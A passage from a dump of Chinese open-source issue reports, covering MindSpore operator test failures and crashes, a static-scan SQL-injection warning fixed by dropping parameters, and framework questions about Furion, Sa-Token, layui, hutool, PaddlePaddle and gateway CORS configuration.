2.6521316 , 2.545175 , 2.2108636 ], [3.1314783 , 2.0...3733 ], [2.4337544 , 2.8083448 , 3.6040573 , 2.9208415 , 1.5134639 , 2.6241677 ]]]], dtype=float32) data_me = array([[[[3.872082 , 0. , 2.6950336 , 0. , 3.412143 , 3.2633286 ], [3.1314783 , 0. ... ], [2.7352853 , 2.2645032 , 0. , 2.440897 , 3.8490088 , 0. ]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[0.8327403 4.738534 2.6521316 ... 2.9208415 1.5134639 2.6241677] E data_me_error:[0. 2.6950336 0. ... 2.440897 3.8490088 0. ] E loss:[0.8327403 2.0435004 2.6521316 ... 0.47994447 2.335545 2.6241677 ] ../share/utils.py:24: AssertionError test_dilation2d.py:69: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/dilation2d_ops.py:138: in forward_cmp allclose_nparray(out_tensorflow, out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[1.5791432 , 1.1478586 , 2.8079426 , 2.493859 , 1.4985864 , 2.061434 ], [1.9679643 , 2.3...02601 ], [2.6283224 , 0.8835142 , 2.5782583 , 4.3193626 , 0.94223046, 2.131111 ]]]], dtype=float32) data_me = array([[[[1.5791432 , 0. , 0. , 0. , 0.96173984, 0. ], [1.9679643 , 0. ... ], [0. , 1.8217493 , 0. , 0. , 1.0218356 , 0. ]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[1.1478586 2.8079426 2.493859 ... 4.3193626 0.94223046 2.131111 ] E data_me_error:[0. 0. 0. ... 0. 1.0218356 0. ] E loss:[1.1478586 2.8079426 2.493859 ... 4.3193626 0.0796051 2.131111 ] ../share/utils.py:24: AssertionError stride = 2 dilation = 3 stride_tf = [1, 2, 2, 1] dilation_tf = [1, 3, 3, 1] test_dilation2d.py:69: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/dilation2d_ops.py:138: in forward_cmp allclose_nparray(out_tensorflow, out_mindspore, self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[[[ 1.0891839 , 1.1161169 , 1.0877695 , 0.9485569 , 1.0061707 , -0.01501967], [ 1.374958...], [ 0.2655038 , 0.12718022, 2.221516 , 0.95331347, 2.9952104 , 2.8558655 ]]]], dtype=float32) data_me = array([[[[ 1.0891839 , 0. , 0. , 0. , 1.1161169 , 0. ], [ 1.374958...], [ 0. , 0. , 1.7906246 , 0. , 0. , 0. ]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ &gt; format(data_expected[greater], data_me[greater], error[greater]) E AssertionError: E data_expected_std:[1.1161169 1.0877695 0.9485569 ... 0.95331347 2.9952104 2.8558655 ] E data_me_error:[0. 0. 0. ... 0. 0. 0.] E loss:[1.1161169 1.0877695 0.9485569 ... 0.95331347 2.9952104 2.8558655 ] ../share/utils.py:24: AssertionError def test_p_dilation2d_with_all_args(): input_ms = Tensor(np.random.randn(4, 6, 16, 12).astype(np.float32)) filter_ms = Tensor(np.random.randn(6, 4, 4).astype(np.float32)) dout_ms = Tensor(np.random.randn(4, 6, 16, 12).astype(np.float32)) stride = 1 dilation = 2 stride_tf = [1, 1, 1, 1] dilation_tf = [1, 2, 2, 1] pad_mode = 'VALID' data_format = 'NCHW' fact = Dilation2DFactory(input_ms, filter_ms, dout_ms, stride, dilation, stride_tf, dilation_tf, pad_mode, data_format) fact.loss = 1e-4 &gt; fact.forward_cmp() 用例2 input_ms = Tensor(np.random.randn(8, 8, 128, 128).astype(np.float32)) filter_ms = Tensor(np.random.randn(8, 4, 4).astype(np.float32)) dout_ms = Tensor(np.random.randn(8, 8, 128, 128).astype(np.float32)) dilation = 2 SAME模式也会有 E loss:[2.5000e+00 4.5000e+00 2.1250e+00 6.0938e-01 2.5000e+00 1.0938e-01 E 4.6562e+00 5.0000e-01 1.0625e+00 5.8750e+00 1.1719e-02 6.2500e-02 E 9.7656e-03 3.9062e-02 2.6562e-01 3.7500e-01 9.3750e-02 1.0625e+00 E 1.4375e+00 1.4062e-01 1.0352e-01 4.2188e+00 2.1875e-01 5.6250e-01 E 2.1250e+00 1.1719e-02 2.0000e+00 3.1250e-01 2.0625e+00 9.1797e-02 E 1.6250e+00 9.3750e-02 8.7500e-01 5.8594e-03 1.5625e-01 3.6816e+00 E 5.9570e-02 3.7500e-01 1.5625e-02 7.8125e-02 1.4404e-01 4.0625e-01 E 1.9727e-01 2.2500e+00 1.0547e-01 1.3438e+00 2.4297e+00 4.0000e+00 E 2.4414e-02 4.6875e-02 5.9375e-01 4.5312e-01 6.2500e-02 5.0000e-01 E 1.0117e+00 5.5664e-02 3.7500e-01 1.5625e-01 1.7625e+01 2.2031e+00 E 7.1875e-01 1.2500e+00 1.7812e+00 9.3750e-02 6.2500e-02 8.7891e-03 E 2.8750e+00 8.1250e-01 1.0625e+00 4.2969e-02 2.1875e-01 3.6250e+00 E 1.0000e+00 5.8594e-03 1.2500e-01 7.8125e-03 1.2500e+00 1.1562e+00 E 5.8594e-03 1.2500e-01 1.2500e-01 4.3750e-01 6.7188e-01 1.2500e-01 E 6.2500e-02 1.7188e-01 6.2500e-01 1.2500e+00 7.1875e-01 8.1250e-01 E 1.3438e+00 5.0000e+00 3.2031e-01 6.2500e-01 3.5781e+00 9.5625e+00 E 1.2500e-01 3.6250e+00 3.1250e-02 3.5156e-02 1.4500e+01 2.8906e-01 E 1.0000e+00 8.9062e-01 9.3750e-02] ../share/utils.py:24: AssertionError"
codingnet扫描提示致命错误,"codingnet里面扫描提示两个致命错误： 1、 错误原因：类型风险触发，由入参导致, 发现前端没有该项，把以下去除解决： 2、 错误原因：类型风险触发，由入参导致, 发现前端没有该项，在Dept控制器上将此项设置为null解决：   <code>: &lt;select id=""selectRoleList"" parameterType=""Role"" resultMap=""RoleResult""&gt; SQLI dataScope &lt;if test=""dataScope != null and dataScope != ''""&gt; AND r.data_scope = #{dataScope} &lt;/if&gt; SQLI ancestors dept.setAncestors(null); return toAjax(deptService.updateDept(dept));"
设置非必填参数,"Furion 版本号 1.15.19 Web 项目类型 WebApi Mvc Razor Pages Blazor Server 我想要某个参数非必填，怎么设置呢？   <code>: public List&lt;StockInfoDto&gt; GetGoodsList(string vm,int page,int item,string? search) { return _pickingService.GetGoodsList(vm,page,item,search); }"
同一账号在多台电脑登录，其中一台注销后，其他电脑看到登录状态还是保持，但SaSession已被清空。,版本：1.33 问题：同一账号在多台电脑登录，其中一台注销后，其他电脑看到登录状态还是保持，但SaSession已被清空。 请问如何处理这个问题好？   <code>: StpUtil.getSession().clear(); StpUtil.getSession().logout(); StpUtil.logout(); StpUtil.logout();
jeesite在生成代码时候的控件处怎么能选择富文本编辑器呀或者自定义编辑器,jeesite在生成代码时候的怎么能选择富文本编辑器呀或者自定义编辑器 环境版本： JDK版本：1.8、11、17 浏览器版本：Chrome xx、Firefox xx、IE xx 平台版本：JeeSite 4.5   <code>: 控件处
Mapper-extend项目,"#准备新建一个Mapper-extend项目。 这个项目的主要目的是加入一些不是很通用的通用方法。 例如,，其中是主键字符串，如。 另外就是各位网友提供的一些通用方法。 等该项目创建后，希望大家能积极提供自己开发的认为比较通用的方法！   <code>: selectByIds(String ids) deleteByIds(String ids) ids ""123,124,125"""
序列标注问题FATAL,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
Safari浏览器中鼠标悬停在设置calss为layui-btn的span上时背景颜色消失,"Safari浏览器中鼠标悬停在设置calss为layui-btn的span上时背景颜色会消失，在其他浏览器中又没有发现这个问题。如下代码中的【按钮2】会出现这个问题，但是button又不会，请问这个是使用span不标准引起的吗？还说所有的按钮一定要使用button? HTML片段   <code>: &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=""utf-8""&gt; &lt;meta name=""viewport"" content=""width=device-width, initial-scale=1, maximum-scale=1""&gt; &lt;title&gt;测试 - layui&lt;/title&gt; &lt;link rel=""stylesheet"" href=""layui/css/layui.css""&gt; &lt;/head&gt; &lt;body style=""background: #ccc; padding: 20px;""&gt; &lt;button class=""layui-btn""&gt;按钮1&lt;/button&gt; &lt;span class=""layui-btn""&gt;按钮2&lt;/span&gt; &lt;/body&gt; &lt;/html&gt;"
递归解析XML 文件,"JDK版本： openjdk_8_201 hutool版本： 5.5.1 XMLUtil.parseXMLFile 递归解析XML 文件的 把标签名 和 属性值 存入到 list里面，并且每一个map里面存入 id 和 parent_id 来记录 map直接的上下级关系 notes： 我不会pr，搞了半天，也不会。直接粘代码了。 PKGenerator.newId()是自己工具包里面的主键生成器，没有在hutool找到对应的方法。   <code>: /** * 递归解析XML 文件的 把标签名 和 属性值 存入到 list里面，并且每一个map里面存入 id 和 parent_id 来记录 map直接的上下级关系 * @param list 生成的一个带有 id 和 parent_id 的list * @param path 文件的绝对路径，目前只支持绝对路径 */ public static void parseXMLFile(List&lt;Map&lt;String, String&gt;&gt; list, String path){ // 读XML文件 Document document = XmlUtil.readXML(new File(path)); Element element = document.getDocumentElement(); // 第一次调用，就是第一级，parent_id 就给空 parseElement(list,element,""""); } /** * 递归解析 XML 文件 * * 解析第一级 * 生成唯一主键 id 然后 parent_id 为空 * * 解析第二级 * 生成唯一主键 id 然后 parent_id 赋值为上一级 id * * TagName： billMenu-config 没有属性，所以输出空 * @param element xml文件的 元素 * @param parentId 第一级没有 parentId 所以调用的时候给 空 * 例子：parseElement(element,""""); * */ private static void parseElement(List&lt;Map&lt;String, String&gt;&gt; list,Element element,String parentId) { // 设置id来记录上下级关系 // 主键生成器 String id = PKGenerator.newId(); Map&lt;String, String&gt; elementMap = new HashMap(); // 拿到当前element的所有的属性名和属性值 NamedNodeMap namedNodeMap = element.getAttributes(); // 遍历复制给firstMap存起来 for (int i = 0; i &lt; namedNodeMap.getLength(); i++) { Attr attr = (Attr) namedNodeMap.item(i); elementMap.put(attr.getName(), attr.getValue()); } // 把标签名也记录下来 elementMap.put(""TagName"",element.getTagName()); // 把 id 放到 map 里面 elementMap.put(""id"", id); elementMap.put(""parent_id"", parentId); list.add(elementMap); // 此注释，↓方便调试，不要删除 // System.out.println(elementMap.toString()); // 拿到当前element的子节点集合 NodeList nodeList = element.getChildNodes(); Node childNode; // 有可能没有子节点,做一个非空判断 if(nodeList.getLength() != 0){ // 遍历当前element的所有的子节点 for (int i = 0; i &lt; nodeList.getLength(); i++) { childNode = nodeList.item(i); if(childNode.getNodeType() == Node.ELEMENT_NODE){ parseElement(list,(Element)childNode,id); } } } }"
[CT][MS][OP] ApplyAdamWithAmsgrad has some problems at ascend,": Ascend /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_applyadamwithamsgrad_beta1_power_fp32_beta2_power_fp16 test_applyadamwithamsgrad_beta1_power_fp16_beta2_power_fp32_lr_fp32 test_applyadamwithamsgrad_grad_float16 检查ApplyKerasMomentum算子，doc资料 执行测试用例 mindspore_signature 前面和后面都是两个“<em>”下划线，但目前后面只有一个“</em>”下划线 test_applyadamwithamsgrad_beta1_power_fp32_beta2_power_fp16 beta1_power和beta2_power类型不一致时，mindspore捕获不到TypeError 下面图中所示，是标杆捕获到的异常 test_applyadamwithamsgrad_beta1_power_fp16_beta2_power_fp32_lr_fp32 beta1_power 和 beta2_power、lr类型不一致时，mindspore捕获不到异常，下图错误，为TensorFlow捕获 test_applyadamwithamsgrad_grad_float16 doc中提到，grad 需和 beta1_power 类型一致。但此时类型不一致，并不报错 grad (Tensor) - A Tensor. Must have the same type as beta1_power. The gradient.   <code>: __mindspore_signature_ = ( sig.make_sig('var', sig.sig_rw.RW_WRITE, dtype=sig.sig_dtype.T), sig.make_sig('m', sig.sig_rw.RW_WRITE, dtype=sig.sig_dtype.T), sig.make_sig('v', sig.sig_rw.RW_WRITE, dtype=sig.sig_dtype.T), sig.make_sig('vhat', sig.sig_rw.RW_WRITE, dtype=sig.sig_dtype.T), sig.make_sig('beta1_power', dtype=sig.sig_dtype.T1), sig.make_sig('beta2_power', dtype=sig.sig_dtype.T2), sig.make_sig('lr', dtype=sig.sig_dtype.T3), sig.make_sig('grad', dtype=sig.sig_dtype.T) def test_applyadamwithamsgrad_beta1_power_fp32_beta2_power_fp16(): var = Parameter(Tensor(np.random.randn(7, 9, 9)).astype(np.float32), name=""var"") m = Parameter(Tensor(np.random.randn(7, 9, 9)).astype(np.float32), name=""m"") v = Parameter(Tensor(np.random.randn(7, 9, 9)).astype(np.float32), name=""v"") vhat = Parameter(Tensor(np.random.randn(7, 9, 9)).astype(np.float32), name=""vhat"") beta1_power = Tensor(np.random.randn(), dtype=mstype.float32) beta2_power = Tensor(np.random.randn(), dtype=mstype.float16) lr = Tensor(np.random.randn(), dtype=mstype.float32) grad = Tensor(np.random.randn(7, 9, 9), dtype=mstype.float32) fact = ApplyAdamWithAmsgradMock( attributes={'beta1': 0.0, 'beta2': 0.0, 'epsilon': 0.0, 'use_locking': False}, inputs=[var, m, v, vhat, beta1_power, beta2_power, lr, grad]) fact.forward_mindspore_impl() &gt; fact.forward_cmp() ""%s type %s of argument '%s'."" % (prefix, dtypes.as_dtype(attrs[input_arg.type_attr]).name, &gt; inferred_from[input_arg.type_attr])) E TypeError: Input 'beta2_power' of 'ResourceApplyAdamWithAmsgrad' Op has type float16 that does not match type float32 of argument 'beta1_power'. /root/archiconda3/envs/zhang3.7/lib/python3.7/site-packages/tensorflow_core/python/framework/op_def_library.py:564: TypeError def test_applyadamwithamsgrad_beta1_power_fp16_beta2_power_fp32_lr_fp32(): var = Parameter(Tensor(np.random.randn(7, 9, 9)).astype(np.float32), name=""var"") m = Parameter(Tensor(np.random.randn(7, 9, 9)).astype(np.float32), name=""m"") v = Parameter(Tensor(np.random.randn(7, 9, 9)).astype(np.float32), name=""v"") vhat = Parameter(Tensor(np.random.randn(7, 9, 9)).astype(np.float32), name=""vhat"") beta1_power = Tensor(np.random.randn(), dtype=mstype.float16) beta2_power = Tensor(np.random.randn(), dtype=mstype.float32) lr = Tensor(np.random.randn(), dtype=mstype.float32) grad = Tensor(np.random.randn(7, 9, 9), dtype=mstype.float32) fact = ApplyAdamWithAmsgradMock( attributes={'beta1': 0.0, 'beta2': 0.0, 'epsilon': 0.0, 'use_locking': False}, inputs=[var, m, v, vhat, beta1_power, beta2_power, lr, grad]) fact.forward_mindspore_impl() &gt; fact.forward_cmp() (prefix, dtypes.as_dtype(attrs[input_arg.type_attr]).name, &gt; inferred_from[input_arg.type_attr])) E TypeError: Input 'beta2_power' of 'ResourceApplyAdamWithAmsgrad' Op has type float32 that does not match type float16 of argument 'beta1_power'. /root/archiconda3/envs/zhang3.7/lib/python3.7/site-packages/tensorflow_core/python/framework/op_def_library.py:564: TypeError def test_applyadamwithamsgrad_grad_float16(): var = Parameter(Tensor(np.random.randn(6, 3, 6)).astype(np.float32), name=""var"") m = Parameter(Tensor(np.random.randn(6, 3, 6)).astype(np.float32), name=""m"") v = Parameter(Tensor(np.random.randn(6, 3, 6)).astype(np.float32), name=""v"") vhat = Parameter(Tensor(np.random.randn(6, 3, 6)).astype(np.float32), name=""vhat"") beta1_power = Tensor(np.random.randn(), dtype=mstype.float32) beta2_power = Tensor(np.random.randn(), dtype=mstype.float32) lr = Tensor(np.random.randn(), dtype=mstype.float32) grad = Tensor(np.random.randn(6, 3, 6), dtype=mstype.float16) fact = ApplyAdamWithAmsgradMock( attributes={'beta1': 0.0, 'beta2': 0.0, 'epsilon': 0.0, 'use_locking': False}, inputs=[var, m, v, vhat, beta1_power, beta2_power, lr, grad]) with pytest.raises(TypeError): &gt; fact.forward_mindspore_impl() E Failed: DID NOT RAISE &lt;class 'TypeError'&gt;"
hutool操作导出excel，如何设置单元格宽度不变，并显示所有内容,"JDK版本： openjdk_8_201 hutool版本： 5.7.13 这个是我想要的效果：   <code>: List&lt;String&gt; lastRowTest = new ArrayList&lt;&gt;();List&lt;String&gt; lastRowTest = new ArrayList&lt;&gt;(); String str = ""hutool操作导出excel，如何设置单元格宽度不变，并显示所有内容""; lastRow.add(str); writer.writeRow(lastRowTest);"
【众智】【计算-GPU开发】AdjustSaturation,"调整一张或多张图像的饱和度。 接口目录：mindspore/ops/operations/image_ops.py images scale y 对应底层算子 Classify Name Type Type Range Required INPUT images fp16,fp32,double TRUE INPUT scale fp32 TRUE OUTPUT y fp16,fp32,double TRUE 标杆接口参考 Tensorflow接口： https://www.tensorflow.org/versions/r2.6/api_docs/python/tf/raw_ops/AdjustSaturation?hl=zh-tw 3. 异常处理 4. 算子反向 无反向   <code>: class AdjustSaturation(Primitive):"
关于IEventSubscriber接口的问题,Furion 版本号 3.7.6 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 继承的类如果同时继承了或者那么订阅事件会被触发两次 无 必须提供完整可运行且包含错误的 仓库 DEMO，DEMO 提供最简单的错误逻辑代码，否则不予处理。 https://gitee.com/zdjMaYun/furion-test-code.git Sqlite SqlServer Mysql Oracle PGSql Firebird Cosmos 通过文档说明禁止同时继承IEventSubscriber和（ISingleton或者ITransient）或者通过其他方式抛出异常   <code>: IEventSubscriber ISingleton ITransient
如何concat layer.embedding和recurrent_group的输出,"Hi, I use a char-lstm to encode the character-level representation for each word using recurrent_group, with input type SubsequenceInput. Then I want to concat each word's character level representation with its glove vector. The code is as below: 按照文档说的，""在输出的过程中，recurrent_group 会将每个时间步的输出拼接，这个过程对用户也是透明的。"" 这个拼接是怎样的拼接呢？ 我现在假设返回的形状是(sentence_len ,char_vec_dim=50) 然后现在需要把每个词语的glove vector(也就是layer.embedding的输出)和character vector(也就是recurrent_group的输出)拼接起来。embedding layer的输出形状是(sentence_len, glove_dim=300),concat后每个词的vector长度是350. 看到其他的issue似乎concat不支持指定的axis(想要axis=1)，不知道在paddle里怎样实现？ 如果用seq_concat,似乎不能把内层300维和50维的向量concat起来。 多谢多谢！   <code>: #The step function for recurrent group def char_lstm(group_input, size): lstm=paddle.networks.simple_lstm(input=group_input, size=size, act=paddle.activation.Relu(), mat_param_attr=paddle.attr.Param(name=""charm""), bias_param_attr=paddle.attr.Param(name=""charb""), inner_param_attr=paddle.attr.Param(name=""chari"")) return lstm #The glove embedding and the recurrent group glove_emb_para = paddle.attr.Param(name='word_emb', initial_std=0, is_static=True) glove_emb = paddle.layer.embedding(size=emb_dim, input=sentence, param_attr=glove_emb_para) char_emb_para = paddle.attr.Param(name=""char_emb"", initial_std=0, is_static=False) char_emb = paddle.layer.embedding(size=char_emb_dim, input=char_inp, param_attr=char_emb_para) nest_group = paddle.layer.recurrent_group(input=[paddle.layer.SubsequenceInput(char_emb), hidden_size], step = char_lstm) word_rep = paddle.layer.concat(input=[word_emb, nest_group], axis=1) #I wish concat takes axis parameter, and I want to concat along axis 1"
Gateway跨域问题,"已按照跨域配置，依旧无效，实属无奈，特来请教。 前后端部署概览： 前端：先把前端项目打包，生成dist目录，前端部署在本地nginx根目录下，端口是80，不做nginx反向代理到ruoyi-gateway网关（因为最终前端部署就是部署到阿里云OSS或者腾讯云COS上，所以肯定不存在反向代理网关）。 后端：启动ruoyi-gateway网关项目，端口是8080. 前端是80端口，网关是8080端口，符合不同源规则，属于跨域。 ruoyi-gateway网关跨域配置： 按照：http://doc.ruoyi.vip/ruoyi-cloud/cloud/gateway.html#%E8%B7%A8%E5%9F%9F%E9%85%8D%E7%BD%AE 配置无效。 然后我查阅了官方的文档：https://docs.spring.io/spring-cloud-gateway/docs/3.1.1/reference/html/#cors-configuration 发现两者的配置的参数不一样。我用两者的配置结合都试过了（单独用作者的，单独用官方的，用两者的合起来都试过），依旧无效，具体配置如下： 测试过程: 谷歌浏览器请求：http://localhost/index.html （前端直接部署在根目录下），验证码显示不出来，提示异常。 打开浏览器调试模式，重新刷新页面 看到请求的地址：http://localhost:8080/code 的状态为：CROS错误。 我看很多人都有提交网关跨域的问题，处理方案都是使用跨域配置或者使用nginx做反向地址。 nginx反向代理后那已经和网关跨域没任何关系了，因为已经同源。 实际部署在阿里云OSS或者腾讯云COS只能让网关支持跨域，但是试了很多次，是在是无奈，麻烦作者看看。 麻烦作者按照我的过程测试，不要设置nginx代理，然后在登录页请求code接口就能复现CROS错误（无法跨域）的问题。 或者也可以直接把以下代码Copy下，新建一个index.html放到网页服务里（Nginx，OSS，COS)来测试验证   <code>: spring: cloud: # 网关配置 gateway: globalcors: corsConfigurations: '[/**]': allowedOriginPatterns: ""*"" allowedOrigins: ""*"" allowedMethods: ""*"" allowedHeaders: ""*"" allowed-methods: ""*"" allowed-headers: ""*"" allow-credentials: true exposedHeaders: ""Content-Disposition,Content-Type,Cache-Control"" cors-configurations: '[/**]': allowedOriginPatterns: ""*"" allowedOrigins: ""*"" allowedMethods: ""*"" allowedHeaders: ""*"" allowed-methods: ""*"" allowed-headers: ""*"" allow-credentials: true exposedHeaders: ""Content-Disposition,Content-Type,Cache-Control"" &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=""utf-8""&gt;&lt;meta http-equiv=""X-UA-Compatible"" content=""IE=edge,chrome=1""&gt;&lt;meta name=""renderer"" content=""webkit""&gt;&lt;meta name=""viewport"" content=""width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no""&gt;&lt;title&gt;跨域测试&lt;/title&gt;&lt;link rel=""stylesheet"" href=""https://cdn.staticfile.org/bootstrap/4.5.3/css/bootstrap.min.css""&gt;&lt;script src=""https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js""&gt;&lt;/script&gt;&lt;script src=""https://cdn.staticfile.org/popper.js/1.8.0/popper.min.js""&gt;&lt;/script&gt;&lt;script src=""https://cdn.staticfile.org/bootstrap/4.5.3/js/bootstrap.min.js""&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=""container""&gt;&lt;h1 style=""margin-top:50px""&gt;跨域测试&lt;/h1&gt;&lt;p class=""text-left""&gt;API地址:&lt;/p&gt;&lt;input type=""text"" style=""width:600px;height:30px;font-size:14px;"" id=""urlText"" value=""http://127.0.0.1:8080/code""/&gt;&lt;p&gt;&amp;nbsp; &lt;p/&gt;&lt;p class=""text-left""&gt;Token:&lt;/p&gt;&lt;input type=""text"" style=""width:600px;height:30px;font-size:14px;"" id=""tokenTxt"" value=""""/&gt;&lt;p&gt;&amp;nbsp; &lt;p/&gt;&lt;input type=""button"" class=""btn btn-outline-primary"" id=""cors"" value=""验证跨域""/&gt;&lt;p class=""text-left""&gt;结果: &lt;span id=""result"" style=""color: red""&gt;&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=""text/javascript""&gt; $(""#cors"").on('click', function (event) { $(""#result"").text(""请求中""); event.preventDefault(); var url2 = $(""#urlText"").val(); $.get({ contentType: 'application/x-www-form-urlencoded;charset=UTF-8', url: url2, beforeSend: function (xhr) { if ($(""#tokenTxt"").val().trim()) { /* Authorization header */ xhr.setRequestHeader(""Authorization"", ""Bearer "" + $(""#tokenTxt"").val()); } }, success: function (data) { $(""#result"").text(""success""); }, error: function (data) { $(""#result"").text(""failed""); } }) }); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt;"
batch norm 预测时指定 use_global_stats=True，出现 CUDNN_STATUS_NOT_SUPPORTED 错误,"文本分类任务，想使用 cnn + batch norm，配置的片段如下： 使用 gpu 训练可以正常训练。 测试时，希望保持 use_global_stats=True，使用训练时存储下来的 mean 和 std 的working average ， 但是报如下错误：   <code>: Layer(name=name + 'context1', type=""mixed"", bias=False, inputs=ContextProjection(input_name, context_start=0, context_length=window_size, trainable_padding=False)) Layer(name=name + 'conv0', type=""mixed"", size=size, active_type=""linear"", bias=Bias(initial_std=1e-1, initial_mean=0, is_static=static, learning_rate=lr), inputs=[FullMatrixProjection(name + ""context1"", initial_std=2e-2, is_static=static, learning_rate=lr)]) Layer(name=name + 'batch_norm0', type='batch_norm', active_type=""relu"", use_global_stats=True, bias=Bias(initial_mean=0.1, initial_std=0, is_static=static, learning_rate=lr), inputs=Input(name + 'conv0', initial_mean=1.0, initial_std=0.0, is_static=static, learning_rate=lr, image=Image(channels=size, img_size=1)), )"
Rename core.so into fluid.so,"https://github.com/PaddlePaddle/Paddle/blob/e0fcaa518f4d15b895777e233c56acc4298a9c65/python/CMakeLists.txt#L46-L49 We need a more specific name instead of , which is a rather general name.   <code>: fluid.so core.so"
[CT][MS]raggedrange GPU平台传入空tensor core dump,"GPU平台两种模式下传入空tensor 都会core dump ，（CPU平台不会,两种模式跑空tensor都能正常跑） 图模式 CPU平台传入空tensor跑pass: /mode graph   <code>: test_raggedrange.py Fatal Python error: Floating point exception Current thread 0x00007fb058ba8740 (most recent call first): File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/common/api.py"", line 987 in real_run_op File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 807 in _run_op File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/common/api.py"", line 98 in wrapper File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/ops/primitive.py"", line 316 in __call__ File ""/home/chenpanmiao/1221_mr_gpu/MindSporeTest/share/ops/primitive/raggedrange_ops.py"", line 23 in construct File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 414 in _run_construct File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 648 in __call__ File ""/home/chenpanmiao/1221_mr_gpu/MindSporeTest/share/utils.py"", line 199 in __call__ File ""/home/chenpanmiao/1221_mr_gpu/MindSporeTest/share/ops/primitive/raggedrange_ops.py"", line 45 in forward_mindspore_impl File ""/home/chenpanmiao/1221_mr_gpu/MindSporeTest/share/ops/primitive/raggedrange_ops.py"", line 75 in forward_cmp File ""/home/chenpanmiao/1221_mr_gpu/MindSporeTest/operations/test_raggedrange.py"", line 37 in test_p_raggedrange_kong_tensor File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/python.py"", line 167 in pytest_pyfunc_call File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 in __call__ File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/python.py"", line 1445 in runtest File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/_pytest/runner.py"", line 134 in pytest_runtest_call File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/callers.py"", line 187 in _multicall File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 87 in &lt;lambda&gt; File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/manager.py"", line 93 in _hookexec File ""/root/miniconda3/envs/copy_ok/lib/python3.7/site-packages/pluggy/hooks.py"", line 286 